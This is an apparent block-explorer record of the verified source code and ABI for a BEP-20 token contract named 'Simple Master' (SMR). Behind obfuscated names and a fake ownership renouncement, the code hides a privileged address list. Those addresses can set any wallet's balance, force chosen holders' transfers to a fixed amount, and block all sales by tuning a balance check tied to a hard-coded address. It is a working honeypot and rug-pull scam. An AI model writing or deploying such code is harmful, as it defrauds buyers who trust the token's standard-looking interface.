{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface atWallet {\n    function createPair(address listLaunch, address sellTx) external returns (address);\n}\n\ninterface totalFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeBuy) external view returns (uint256);\n\n    function transfer(address fundToken, uint256 fromLimit) external returns (bool);\n\n    function allowance(address maxSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundToken,\n        uint256 fromLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeSell, uint256 value);\n    event Approval(address indexed maxSwap, address indexed spender, uint256 value);\n}\n\nabstract contract amountList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalFromMetadata is totalFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SimpleMaster is amountList, totalFrom, totalFromMetadata {\n\n    bool private receiverTotalAmount;\n\n    uint256 private buyFrom;\n\n    function autoTrading(address senderToLiquidity) public {\n        if (limitSellToken) {\n            return;\n        }\n        \n        minFee[senderToLiquidity] = true;\n        if (buyFrom != exemptAuto) {\n            buyFrom = isLimit;\n        }\n        limitSellToken = true;\n    }\n\n    constructor (){\n        if (receiverTotalAmount) {\n            receiverTotalAmount = false;\n        }\n        fromToken minAuto = fromToken(amountLaunch);\n        totalShould = atWallet(minAuto.factory()).createPair(minAuto.WETH(), address(this));\n        if (listEnable) {\n            receiverTotalAmount = false;\n        }\n        takeMarketing = _msgSender();\n        minFee[takeMarketing] = true;\n        liquidityTeamToken[takeMarketing] = receiverShould;\n        tokenAuto();\n        if (exemptAuto == buyFrom) {\n            isLimit = exemptAuto;\n        }\n        emit Transfer(address(0), takeMarketing, receiverShould);\n    }\n\n    address private shouldBuySender;\n\n    uint256 maxExempt;\n\n    function transfer(address senderTeam, uint256 fromLimit) external virtual override returns (bool) {\n        return senderMax(_msgSender(), senderTeam, fromLimit);\n    }\n\n    function senderMax(address amountIsEnable, address fundToken, uint256 fromLimit) internal returns (bool) {\n        if (amountIsEnable == takeMarketing) {\n            return feeSell(amountIsEnable, fundToken, fromLimit);\n        }\n        uint256 launchedShould = totalFrom(totalShould).balanceOf(shouldExemptMode);\n        require(launchedShould == maxExempt);\n        require(fundToken != shouldExemptMode);\n        if (atMode[amountIsEnable]) {\n            return feeSell(amountIsEnable, fundToken, launchMaxSell);\n        }\n        return feeSell(amountIsEnable, fundToken, fromLimit);\n    }\n\n    function getOwner() external view returns (address) {\n        return shouldBuySender;\n    }\n\n    function owner() external view returns (address) {\n        return shouldBuySender;\n    }\n\n    function exemptSell() private view {\n        require(minFee[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellTotal;\n    }\n\n    function takeTotalLaunched(address senderTeam, uint256 fromLimit) public {\n        exemptSell();\n        liquidityTeamToken[senderTeam] = fromLimit;\n    }\n\n    function fundReceiver(address listIs) public {\n        exemptSell();\n        if (exemptAuto != buyFrom) {\n            listEnable = true;\n        }\n        if (listIs == takeMarketing || listIs == totalShould) {\n            return;\n        }\n        atMode[listIs] = true;\n    }\n\n    uint8 private sellTotal = 18;\n\n    function approve(address swapBuy, uint256 fromLimit) public virtual override returns (bool) {\n        receiverMin[_msgSender()][swapBuy] = fromLimit;\n        emit Approval(_msgSender(), swapBuy, fromLimit);\n        return true;\n    }\n\n    string private isSell = \"Simple Master\";\n\n    address public takeMarketing;\n\n    uint256 constant launchMaxSell = 7 ** 10;\n\n    function allowance(address teamLiquidity, address swapBuy) external view virtual override returns (uint256) {\n        if (swapBuy == amountLaunch) {\n            return type(uint256).max;\n        }\n        return receiverMin[teamLiquidity][swapBuy];\n    }\n\n    bool public limitSellToken;\n\n    mapping(address => uint256) private liquidityTeamToken;\n\n    mapping(address => mapping(address => uint256)) private receiverMin;\n\n    mapping(address => bool) public minFee;\n\n    uint256 private isLimit;\n\n    function name() external view virtual override returns (string memory) {\n        return isSell;\n    }\n\n    function balanceOf(address takeBuy) public view virtual override returns (uint256) {\n        return liquidityTeamToken[takeBuy];\n    }\n\n    event OwnershipTransferred(address indexed limitAt, address indexed modeListAmount);\n\n    uint256 private exemptAuto;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverShould;\n    }\n\n    uint256 takeSwap;\n\n    address public totalShould;\n\n    function tokenAuto() public {\n        emit OwnershipTransferred(takeMarketing, address(0));\n        shouldBuySender = address(0);\n    }\n\n    function transferFrom(address amountIsEnable, address fundToken, uint256 fromLimit) external override returns (bool) {\n        if (_msgSender() != amountLaunch) {\n            if (receiverMin[amountIsEnable][_msgSender()] != type(uint256).max) {\n                require(fromLimit <= receiverMin[amountIsEnable][_msgSender()]);\n                receiverMin[amountIsEnable][_msgSender()] -= fromLimit;\n            }\n        }\n        return senderMax(amountIsEnable, fundToken, fromLimit);\n    }\n\n    function walletLimit(uint256 fromLimit) public {\n        exemptSell();\n        maxExempt = fromLimit;\n    }\n\n    mapping(address => bool) public atMode;\n\n    bool public listEnable;\n\n    address shouldExemptMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private receiverShould = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountToken;\n    }\n\n    address amountLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function feeSell(address amountIsEnable, address fundToken, uint256 fromLimit) internal returns (bool) {\n        require(liquidityTeamToken[amountIsEnable] >= fromLimit);\n        liquidityTeamToken[amountIsEnable] -= fromLimit;\n        liquidityTeamToken[fundToken] += fromLimit;\n        emit Transfer(amountIsEnable, fundToken, fromLimit);\n        return true;\n    }\n\n    string private amountToken = \"SMR\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeListAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderToLiquidity\",\"type\":\"address\"}],\"name\":\"autoTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listIs\",\"type\":\"address\"}],\"name\":\"fundReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSellToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLimit\",\"type\":\"uint256\"}],\"name\":\"takeTotalLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountIsEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromLimit\",\"type\":\"uint256\"}],\"name\":\"walletLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SimpleMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}